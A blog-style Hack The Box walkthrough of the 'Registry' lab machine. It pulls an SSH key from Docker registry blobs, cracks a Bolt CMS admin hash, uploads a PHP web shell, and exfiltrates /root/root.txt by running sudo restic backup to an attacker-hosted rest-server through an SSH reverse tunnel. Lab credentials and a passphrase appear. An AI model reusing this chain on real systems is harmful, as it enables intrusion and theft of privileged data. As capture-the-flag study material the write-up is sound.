---
title:     "Hack The Box - Registry"
tags: [linux,hard,sudo,sqlite,firewall,restic,]
layout: post
---

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-registry/1.1.png)

We are going to pwn Registry by thek from Hack The Box.

Link : <https://www.hackthebox.eu/home/machines/profile/213>


Lets Begin with our Initial Nmap Scan.

## Nmap Scan Results:

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 72:d4:8d:da:ff:9b:94:2a:ee:55:0c:04:30:71:88:93 (RSA)
|   256 c7:40:d0:0e:e4:97:4a:4f:f9:fb:b2:0b:33:99:48:6d (ECDSA)
|_  256 78:34:80:14:a1:3d:56:12:b4:0a:98:1f:e6:b4:e8:93 (ED25519)
80/tcp  open  http     nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Welcome to nginx!
443/tcp open  ssl/http nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: 400 The plain HTTP request was sent to HTTPS port
| ssl-cert: Subject: commonName=docker.registry.htb
| Not valid before: 2019-05-06T21:14:35
|_Not valid after:  2029-05-03T21:14:35
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.18 (94%), Linux 3.16 (93%), ASUS RT-N56U WAP (Linux 3.4) (93%), Android 4.1.1 (93%), Adtran 424RG FTTH gateway (92%), Linux 2.6.32 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## HTTP:

The Web server is running as nginx. Nothing special.
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-registry/1.png)

## HTTPS:

Nmap Reveals the commonName for the ``HTTPS`` is ``docker.registry.htb``, So I added them in ``/etc/hosts``<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-registry/2.png)
Its blank. There must be something running on the background.

Started my Gobuster to find any interesting directories.

## Gobuster Result:
```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://docker.registry.htb
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/03/15 12:32:41 Starting gobuster
===============================================================
/v2 (Status: 301)
===============================================================
2020/03/15 12:35:03 Finished
===============================================================
```
``/v2``<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-registry/3.png)<br/>
It asks for login authentication, I tried some default credentials and got logged in with ``admin:admin``

I looked at the ``headers`` tab and found ``Docker-Distribution-Api-Version	: registry/2.0``<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-registry/5.png)

I started searching for any exploits available for ``docker registry`` and found this.

#### Reference:
><https://www.notsosecure.com/anatomy-of-a-hack-docker-registry/>

><https://blog.dixitaditya.com/exploiting-docker-registry/>

We already know the version of API ``/v2``, we can find list of repos in the registry using ``/_catalog``<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-registry/4.png)<br/>
Here only one repo which is ``bolt-image``<br/>

Let's explore the ``bolt-image`` and find out the tags listed for this repo using the ``/bolt-image/tags/list``
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-registry/6.png)

Since we identified there is only one tag ``latest`` , let’s download the manifest file for the ``latest`` tag using the ``/manifests/latest``
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-registry/7.png)

``latest``<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-registry/8.png)

#### What is blob?
>A Binary Large OBject is a collection of binary data stored as a single entity in a database management system. Blobs are typically images, audio or other multimedia objects, though sometimes binary executable code is stored as a blob.

These are the blobs, we can download each blob using ``/blobs/sha256:/********`` 
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-registry/9.png)<br/>
Like this I downloaded all.

The file is an ``gzip compressed data`` so I rename to ``.gz`` and I decompress it with ``gzip -d ``<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-registry/10.png)<br/>
This file shows the content of how the ssh keys created in the box. When it asks for ``passphrase``, the entered passphrase is displayed as ``send``.<br/>
```
expect "Enter passphrase for /root/.ssh/id_rsa:"
send "GkOcz221Ftb3ugog\n";
```
This will be ssh passphrase ``GkOcz221Ftb3ugog``, So we might get ssh private key If we keep on dig them all.

Other files doesn't give anything useful unless this one, The total size is 90mb so this might contain some useful things.<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-registry/11.png)

Its an ``.gz`` file renamed and extracted now it is an ``tar`` file ``tar -xf`` to decompress the file.<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-registry/12.png)<br/>
We got bunch of directories, we already got ssh passphrase so I started looking for ssh private keys.<br/>

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-registry/13.png)<br/>
I got the private keys in ``/root/.ssh/id_rsa``. <br/>
<br/>
While checking the blob files, I found that user ``bolt`` private keys are stored in ``/root/.ssh/``<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-registry/14.png)

## SSH Login:

Using ``GkOcz221Ftb3ugog`` I logged in ``ssh -i id_rsa bolt@registry.htb``<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-registry/15.png)


While enumerating I found ``backup.php`` in ``/var/www/html``
```
bolt@bolt:/var/www/html$ cat backup.php 
<?php shell_exec("sudo restic backup -r rest:http://backup.registry.htb/bolt bolt");
```
It executes a backup application with ``sudo``, so we need user ``www-data`` to run a restic command as root. Added ``backup.registry.htb`` in my hosts file.

``backup.registry.htb/bolt``<br/>

It's a Bolt CMS<br/>

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-registry/16.png)

Found a login page in ``http://backup.registry.htb/bolt/bolt``, Cant login with default credentials.
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-registry/17.png)

While enumerating I found bolt database in ``/var/www/html/bolt/app/database``
```
bolt@bolt:/var/www/html/bolt/app/database$ ls
bolt.db
```
Downloaded that to my machine to check whats inside.
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-registry/18.png)
There is lot of tables but ``bolt_users`` seems interesting. So I dump them all. Found ``admin`` hash.
>https://www.sitepoint.com/getting-started-sqlite3-basic-commands/

I cracked them using John.<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-registry/19.png)<br/>
So the password is ``strawberry``.

Logged in with ``admin : stawberry``
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-registry/20.png)

Now we need to find a way to get a shell as ``www-data`` inorder to run ``restic`` as root.
I tried editing the themes in ``File Management -> skeleton`` but they filtering ``php`` files. Since we are the admin I tried editing the ``config`` file.

``Configuration -> Main Configuration``
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-registry/21.png)
Added ``php`` in ``accept_file_types``.

After, I uploaded [P0wny Web Shell](https://github.com/flozz/p0wny-shell), we were not able to get a reverse shell. There must be some firewall rules there.
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-registry/22.png)

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-registry/23.png)

## Privilege Escalation:

We already know, we can run ``restic`` as root in ``www-data`` without password.
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-registry/24.png)

I checked the manual.
>https://restic.readthedocs.io/en/latest/manual_rest.html

It looks like we can run server in our machine and take backup of ``/root`` directory of the box.

### First Step: Create Restic Repo and Run on your local rest-server

```
sudo restic init --repo /tmp/restic
enter password for new repository: 
enter password again: 
created restic repository 41f82a77b4 at /tmp/restic


Please note that knowledge of your password is required to access
the repository. Losing your password means that your data is
irrecoverably lost.

password: 123

----------------------------------------------------

rest-server --no-auth --listen 0.0.0.0:8001
Data directory: /tmp/restic
Authentication disabled
Private repositories disabled
Starting server on 0.0.0.0:8001
....(Running Live)

-----------------------------------------------------
```

### Second Step: SSH Portfoward

```
ssh -R 8001:127.0.0.1:8001 -i id_rsa bolt@registry.htb 
Enter passphrase for key 'id_rsa': 


Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)

  System information as of Sun Jan  5 16:03:28 UTC 2020

  System load:  0.04              Users logged in:                0
  Usage of /:   5.6% of 61.80GB   IP address for eth0:            10.10.10.159
  Memory usage: 25%               IP address for br-1bad9bd75d17: 172.18.0.1
  Swap usage:   0%                IP address for docker0:         172.17.0.1
  Processes:    155
Last login: Sun Jan  5 16:02:51 2020 from 10.10.16.82
bolt@bolt:~$

------------------------------------------------------
```
``-R`` to Remote port forward, this will redirecting all connections from one port to another remote. 

### Last Step: Using www-data shell

```
$ echo 123 >/tmp/r

(123 is my password)

p0wny@shell:/tmp# sudo /usr/bin/restic backup -r rest:http://127.0.0.1:8001/ -p /tmp/r /root/root.txt
/tmp/r /root/root.txt
scan [/root/root.txt]
[0:00] 0 directories, 1 files, 33B
scanned 0 directories, 1 files in 0:00
[0:01] 100.00%  33B / 33B  1 / 1 items  0 errors  ETA 0:00

duration: 0:01
snapshot b9d28d7c saved
-------------------------------------------------------
```
### Restoring from the snapshot

```
root@w0lf:/tmp/restic/snapshots# restic -r /tmp/restic/ restore b9d28d7c --target /tmp/restic/
enter password for repository: 
repository 41f82a77 opened successfully, password is correct
created new cache in /root/.cache/restic
restoring <Snapshot b9d28d7c of [/root/root.txt] at 2020-04-04 19:37:22.586614963 +0000 UTC by root@bolt> to /tmp/restic/




root@w0lf:/tmp/restic# cat root.txt 
nt------------------------------gw
root@w0lf:/tmp/restic# 
```

Like this we can take backup of the root's ssh private key and login as root.
